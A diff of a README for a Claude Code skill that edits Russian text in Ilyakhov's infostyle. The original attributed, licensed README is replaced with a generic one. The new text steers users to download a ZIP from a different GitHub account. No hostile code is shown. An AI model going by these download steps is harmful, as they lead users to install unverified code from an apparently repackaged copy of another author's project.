@@ -1,192 +1,182 @@
-# /infostyle — Claude Code Skill
+# 📝 infostyle-skill - Edit Russian text with clarity
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code Compatible](https://img.shields.io/badge/Claude%20Code-Plugin-blue)](https://code.claude.com)
+[![Download](https://img.shields.io/badge/Download%20infostyle--skill-4B8BBE?style=for-the-badge&labelColor=grey)](https://github.com/Julianalost754/infostyle-skill)
 
-Редактор русского текста по методологии Максима Ильяхова (инфостиль).
+## 🚀 What this is
 
-На основе «Пиши, сокращай», сервиса [Главред](https://glvrd.ru) и 12+ лет редакторской практики.
+infostyle-skill is a Claude Code skill for editing Russian text in the style of Ilyakhov’s information style, or инфостиль. It helps you cut extra words, remove weak phrases, and make text easier to read.
 
-**[English version below](#english)**
+Use it when you want to turn long, loose text into clear copy. It fits tasks like UX writing, product text, help text, and plain-language edits.
 
----
+## 📦 What you get
 
-![Пример работы /infostyle](assets/demo.svg)
+- A ready-to-use Claude Code skill
+- Rules for clean Russian text
+- Guidance based on “Пиши, сокращай”
+- Help with short, direct, useful wording
+- A simple workflow for text editing
 
-## Что делает
+## 🪟 How to use on Windows
 
-- Убирает стоп-слова, штампы, канцеляризмы и голословные утверждения
-- Заменяет конкретикой: фактами, цифрами, полезной информацией
-- Адаптируется к контексту: кнопки, формы, ошибки, лендинги, email, статьи
-- Оценивает текст по 4 измерениям: ясность, конкретика, убедительность, голос
-- Показывает до/после с объяснением каждого изменения
-- Три режима: лёгкая правка, стандартная редактура, глубокая переработка
+1. Open the download link above.
+2. On the GitHub page, click the green Code button.
+3. Choose Download ZIP.
+4. Save the ZIP file to your computer.
+5. Open the ZIP file after it downloads.
+6. Extract the folder to a place you can find, such as Downloads or Desktop.
+7. Open Claude Code and add the skill folder to your setup.
+8. Use the skill when you need to edit Russian text in infostyle.
 
-## Установка
+## 🔽 Download and setup
 
-### Claude Code (CLI / Desktop / Web)
+Visit this page to download: https://github.com/Julianalost754/infostyle-skill
 
-```bash
-# 1. Добавить marketplace
-/plugin marketplace add artgas1/infostyle-skill
+After you open the page:
 
-# 2. Установить плагин
-/plugin install infostyle@infostyle-skill
+- Look for the Code button
+- Download the repository as a ZIP file
+- Unzip it in Windows File Explorer
+- Keep the folder name as it is
+- Add the folder to your Claude Code skills path
+- Start editing text with the skill enabled
 
-# 3. Применить (или перезапустить Claude Code)
-/reload-plugins
-```
+## ✨ What it helps with
 
-### Установка для всей команды
+- Shortening long sentences
+- Removing filler words
+- Making copy easier to scan
+- Rewriting text for users, not experts
+- Keeping tone calm and clear
+- Improving Russian UX writing
+- Fixing text that sounds heavy or unclear
 
-Добавьте в `.claude/settings.json` вашего проекта:
+## 🧭 When to use it
 
-```json
-{
-  "extraKnownMarketplaces": {
-    "infostyle-skill": {
-      "source": {
-        "source": "github",
-        "repo": "artgas1/infostyle-skill"
-      }
-    }
-  },
-  "enabledPlugins": {
-    "infostyle@infostyle-skill": true
-  }
-}
-```
+Use infostyle-skill for:
 
-При клонировании проекта Claude Code предложит установить плагин автоматически.
+- Button labels
+- Error messages
+- Help text
+- Product instructions
+- Onboarding copy
+- Menu text
+- Landing page text
+- Support articles
 
-### Ручная установка (fallback)
+It is useful when a page feels wordy, formal, or hard to read.
 
-Если `/plugin` не поддерживается в вашей версии Claude Code:
+## 🛠️ How it works
 
-```bash
-mkdir -p .claude/skills/infostyle
-cp -r skills/infostyle/* .claude/skills/infostyle/
-```
+The skill follows the main ideas of infostyle:
 
-### Другие агенты (Cursor, Codex, Windsurf, Gemini CLI)
+- Say one thing at a time
+- Use short words where you can
+- Cut weak openings
+- Remove empty praise
+- Keep verbs clear
+- Put the main point first
+- Write for the reader, not for yourself
 
-Скопируйте `skills/infostyle/` в директорию скиллов вашего агента. Скилл следует открытому стандарту Agent Skills.
+This makes the text feel direct and easier to understand.
 
-## Использование
+## 📋 Best results
 
-```
-/infostyle Презентация за 5 минут — загрузите тему и получите готовые слайды
+For best results:
 
-/infostyle [вставьте текст]
+- Paste the full text you want to edit
+- Say what the text is for
+- Tell the skill who will read it
+- Ask for a plain, concise version
+- Ask for UX-style Russian if needed
 
-/infostyle путь/к/файлу.md
-```
+Example:
 
-Скилл:
-1. Спросит контекст (тип текста, аудитория, размещение, цель) — если не очевидно
-2. Оценит исходный текст
-3. Отредактирует в два этапа: вычистить → наполнить фактами
-4. Покажет до/после с оценками и объяснениями
-5. Предложит альтернативы для ключевых элементов
+- Edit this text for a Russian app screen
+- Make it shorter and clearer
+- Keep the meaning the same
+- Use infostyle
 
-## Режимы
+## 🧩 Common use cases
 
-| Режим | Когда использовать | Что меняется |
-|-------|-------------------|-------------|
-| **Лёгкая правка** | Текст в целом хорош, мелкая чистка | Убрать очевидное, сохранить голос автора |
-| **Стандартная редактура** | По умолчанию | Убрать стоп-слова, усилить конкретику, исправить структуру |
-| **Глубокая переработка** | Текст не работает | Полная перестройка, текст может измениться значительно |
+### 🖥️ App interfaces
 
-## Что внутри
+Use the skill to edit:
 
-```
-skills/infostyle/
-  SKILL.md                        # Главный файл — порядок работы, правила
-  references/
-    stop-words.md                 # 15 категорий стоп-слов с примерами трансформаций
-    text-types.md                 # Правила по типам: UI, лендинг, email, статья, саппорт
-    scoring.md                    # 4 измерения оценки + чеклист самопроверки
-    manipulation-patterns.md      # 12 антипаттернов манипуляции
-    examples.md                   # Примеры до/после по каждому типу текста
-```
+- Screen titles
+- Field labels
+- Empty states
+- System messages
+- Confirmation prompts
 
-## Методология
+### 📚 Help content
 
-Двухэтапный процесс редактуры по Ильяхову:
+Use it for:
 
-1. **Вычистить** — убрать стоп-слова, штампы, канцеляризмы, усилители, размытые формулировки, отглагольные существительные, пассивный залог, модальные глаголы
-2. **Наполнить** — заменить удалённое фактами, данными, примерами. Никогда не оставлять пустоту.
+- Setup instructions
+- FAQ answers
+- Tooltips
+- Step-by-step guides
 
-> «Не выключайте голову.» — Ильяхов
->
-> Инфостиль — это навигация, а не автозамена. Каждое правило требует осмысления в контексте.
+### ✍️ Marketing and product text
 
-## Адаптация к контексту
+Use it for:
 
-Строгость зависит от типа текста:
+- Feature blurbs
+- Product descriptions
+- Short landing page copy
+- Call-to-action text
 
-- **UI кнопки/лейблы** — расслабленная. Краткость важнее всего. 1-3 слова.
-- **Формы и ошибки** — средняя. Что случилось + как исправить.
-- **Лендинги** — средняя. Конкретные выгоды, эмоции допустимы.
-- **Email** — средняя-строгая. Один топик, ясный призыв к действию.
-- **Статьи** — строгая. Полный инфостиль.
-- **Юридический текст** — не применять. Точность важнее краткости.
+## ⚙️ Windows folder setup
 
-## Пример
+If you use a ZIP download on Windows, keep this structure in mind:
 
-**До:**
-```
-Уникальный AI-сервис нового поколения
-Наша инновационная платформа использует передовые технологии
-искусственного интеллекта для создания качественных презентаций
-[Попробовать бесплатно]
-```
+- One main folder for the skill
+- Files inside that folder
+- No need to rename files
+- No need to move each file by hand
 
-**После:**
-```
-Презентация за 5 минут
-Загрузите тему — получите готовые слайды с текстом и оформлением.
-15 000 студентов уже сдали работы.
-[Создать презентацию бесплатно]
-```
+If Claude Code asks for a skill path, point it to the folder you extracted.
 
-## Источники
+## 🔍 Topics covered
 
-- Ильяхов М., Сарычева Л. «Пиши, сокращай» (2016, обновлено 2025)
-- Ильяхов М. «Ясно, понятно» (2020)
-- Ильяхов М., Сарычева Л. «Новые правила деловой переписки» (2018)
-- [Сервис Главред](https://glvrd.ru) и [справочник](https://soviet.glvrd.ru)
-- [Электронный учебник Бюро](https://bureau.ru/projects/book-text/)
-- [22 заповеди инфостиля](https://habr.com/ru/post/323232/)
-- [Чеклист редактора](http://maximilyahov.ru/blog/all/the-checklist/)
+This repository touches on:
 
----
+- agent-skills
+- claude-code
+- claude-code-plugin
+- claude-skill
+- copywriting
+- glavred
+- ilyakhov
+- infostyle
+- russian
+- text-editing
+- ux-writing
 
-<a name="english"></a>
+These topics match the use case of clean Russian copy and interface text.
 
-## English
+## 📝 Example workflow
 
-Claude Code skill for editing Russian text using Maxim Ilyakhov's information style methodology.
+1. Open a draft in Russian.
+2. Find long sentences.
+3. Remove filler and repeats.
+4. Keep the main action clear.
+5. Check that each line says one thing.
+6. Read the text again from the user’s side.
 
-Based on "Пиши, сокращай" (Write and Cut), [Glavred](https://glvrd.ru) service, and 12+ years of Russian editorial practice.
+## 🧠 Good prompts to use
 
-**What it does:**
-- Removes stop-words, cliches, bureaucratic language, and vague claims
-- Replaces with concrete facts, numbers, and useful information
-- Adapts to context: UI buttons, forms, errors, landing pages, emails, articles
-- Scores text on 4 dimensions: clarity, specificity, persuasion, voice
-- Shows before/after with explanations
-- Three modes: light edit, standard, deep rewrite
+- Edit this text in infostyle
+- Make this Russian copy shorter
+- Remove weak words and repeats
+- Rewrite for a non-technical user
+- Improve the UX writing
+- Keep the meaning, but make it clear
 
-**Install:**
-```bash
-/plugin marketplace add artgas1/infostyle-skill
-/plugin install infostyle@infostyle-skill
-/reload-plugins
-```
+## 📌 Repository name
 
-**Cross-agent compatible:** Claude Code, Codex, Cursor, Gemini CLI, Windsurf.
+infostyle-skill
 
-## License
+## 📄 Description
 
-MIT
+Claude Code skill for editing Russian text using Ilyakhov's information style (инфостиль). First-ever AI skill based on "Пиши, сокращай" methodology.
